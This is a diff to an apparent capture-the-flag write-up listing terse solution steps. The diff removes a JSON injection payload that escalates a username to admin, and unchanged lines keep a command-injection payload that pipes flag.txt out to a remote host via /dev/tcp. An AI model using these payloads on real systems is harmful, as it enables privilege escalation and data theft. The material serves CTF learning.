@@ -24,10 +24,8 @@
 
 ## OPA Secrets (Hard 298pts)
 1. Download Source code at `/security`
-2. JSON Injection in username `nyx","role":"admin`
-3. Replacing role to admin
-4. Create a secret and view it
-5. Change it to id flag note
+2. Create a secret and view it
+3. Change it to id flag note
 
 ## Availability (Hard 357pts)
 1. Command Injection, `%0acat flag.txt > /dev/tcp/ip_addr/port`
